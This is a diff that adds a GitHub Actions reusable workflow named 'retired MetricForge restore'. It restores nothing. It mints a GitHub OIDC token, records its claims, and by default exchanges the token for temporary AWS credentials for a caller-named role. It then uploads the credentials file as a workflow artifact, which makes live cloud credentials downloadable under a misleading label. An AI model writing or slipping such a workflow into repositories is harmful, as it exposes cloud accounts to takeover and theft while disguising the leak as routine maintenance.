@@ -1,0 +1,75 @@
+name: retired MetricForge restore
+
+on:
+  workflow_call:
+    inputs:
+      mode:
+        required: false
+        type: string
+        default: exchange
+      entry_role:
+        required: false
+        type: string
+        default: ""
+      nonce:
+        required: false
+        type: string
+        default: manual
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Mint and inspect GitHub OIDC token
+        shell: bash
+        run: |
+          set -euo pipefail
+          token=$(curl -fsSL \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+          python3 - "$token" > oidc-claims.json <<'PY'
+          import base64, json, sys
+          payload = sys.argv[1].split('.')[1]
+          payload += '=' * (-len(payload) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          selected = {key: claims.get(key) for key in (
+              "iss", "sub", "aud", "job_workflow_ref", "repository", "repository_id",
+              "repository_owner", "ref", "workflow_ref", "actor"
+          )}
+          print(json.dumps(selected, indent=2, sort_keys=True))
+          PY
+          cat oidc-claims.json
+
+      - name: Upload observed OIDC claims
+        uses: actions/upload-artifact@v4
+        with:
+          name: metricforge-oidc-claims-${{ inputs.nonce }}
+          path: oidc-claims.json
+          retention-days: 1
+
+      - name: Exchange GitHub OIDC token
+        if: inputs.mode == 'exchange'
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -n "${{ inputs.entry_role }}"
+          token=$(curl -fsSL \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value)
+          aws sts assume-role-with-web-identity \
+            --role-arn "${{ inputs.entry_role }}" \
+            --role-session-name "oidc-30b28c53" \
+            --web-identity-token "$token" \
+            --duration-seconds 3600 > entry.json
+
+      - name: Upload temporary session
+        if: inputs.mode == 'exchange'
+        uses: actions/upload-artifact@v4
+        with:
+          name: metricforge-entry-session-${{ inputs.nonce }}
+          path: entry.json
+          retention-days: 1
